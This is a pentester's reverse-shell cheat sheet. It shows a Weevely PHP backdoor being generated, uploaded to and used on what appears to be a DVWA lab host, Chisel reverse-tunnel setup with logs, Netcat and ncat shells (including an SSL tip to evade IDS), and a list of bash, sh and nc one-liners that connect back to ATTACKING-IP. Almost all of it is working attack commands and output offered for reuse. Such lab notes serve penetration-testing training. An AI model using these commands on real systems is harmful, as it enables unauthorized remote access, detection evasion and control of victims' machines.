Reverse Shells
Useful links:
https://highon.coffee/blog/reverse-shell-cheat-sheet/
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet


[*] Weevely
    Generate the reverse shell file:

        root@kali:~/Desktop# weevely generate -h
        usage: weevely generate [-h] [-obfuscator {cleartext1_php,obfusc1_php}]
                                [-agent {obfpost_php}]
                                password path

        positional arguments:
          password              Agent password
          path                  Agent file path

        optional arguments:
          -h, --help            show this help message and exit
          -obfuscator {cleartext1_php,obfusc1_php}
          -agent {obfpost_php}

        root@kali:~/Desktop# weevely generate 12345 /root/Desktop/powned.php
        Generated '/root/Desktop/powned.php' with password '12345' of 771 byte size.

    Upload the file on your vulnerable web app running php.
    Use Weevely to execute.

        root@kali:~/Desktop# weevely http://192.168.122.11/dvwa/vulnerabilities/upload/../../hackable/uploads/powned.php 12345

        [+] weevely 4.0.1

        [+] Target:     192.168.122.11
        [+] Session:    /root/.weevely/sessions/192.168.122.11/powned_0.session

        [+] Browse the filesystem or execute commands starts the connection
        [+] to the target. Type :help for more information.

        weevely> ls
        The remote script execution triggers an error 500, check script and payload integrity
        dvwa_email.png
        example.php
        meterpreter.js
        meterpreter.jsp
        meterpreter.php
        meterpreter.sh
        msfvenom.php
        powned.php
        reverse.elf
        shell.elf
        test.txt
        www-data@192.168.122.11:/var/www/dvwa/hackable/uploads $ whoami
        The remote script execution triggers an error 500, check script and payload integrity
        www-data


[*] Chisel

Chisel is used for reverse tunneling, works on Windows, Linux, and Mac
https://github.com/jpillora/chisel/releases

Attacker machine:
codonnell@iphone:~$ ./chisel_linux server -p 8080 --reverse
2020/11/10 21:30:19 server: Reverse tunnelling enabled
2020/11/10 21:30:19 server: Fingerprint 55:2e:d1:98:77:1a:92:10:26:2e:a7:f1:70:48:82:ca
2020/11/10 21:30:19 server: Listening on http://0.0.0.0:8080
2020/11/10 21:32:20 server: session#1: tun: proxy#R:8888=>8888: Listening


Victim:
WINDOWS:
C:\>chisel.exe client 10.10.14.69:8080 R:8888:127.0.0.1:8888
chisel.exe client 10.10.14.69:8080 R:8888:127.0.0.1:8888
2020/11/11 04:39:33 client: Connecting to ws://10.10.14.69:8080
2020/11/11 04:39:34 client: Fingerprint 55:2e:d1:98:77:1a:92:10:26:2e:a7:f1:70:48:82:ca
2020/11/11 04:39:34 client: Connected (Latency 57.7434ms)


[*] Netcat

	Reverse Shell Windows
		Windows Client:
        	nc.exe <ip addr> <port> -m cmd.exe
        Kali Server
        	nc -lvnp <port>

	Use ncat for encryption - good to bypass IDS detection
    	On client - victim machine
        	ncat -v <ip address> <port> --ssl
    	On Server - Attacker machine
        	ncat -lvnp <port number> --ssl


Attacker Machine:
nc -lvnp 1337

Victim Linux (multiple Examples):
	exec /bin/bash 0&0 2>&0
	0<&196;exec 196<>/dev/tcp/ATTACKING-IP/1337; sh <&196 >&196 2>&196
	/bin/bash -i >& /dev/tcp/ATTACKING-IP/1337 0>&1
	/bin/bash -c "/bin/bash -i >& /dev/tcp/ATTACKING-IP/1337 0>&1"
	/bin/sh -i >& /dev/tcp/ATTACKING-IP/1337 0>&1
	nc -e /bin/sh ATTACKING-IP 1337
	/bin/sh | nc ATTACKING-IP 1337

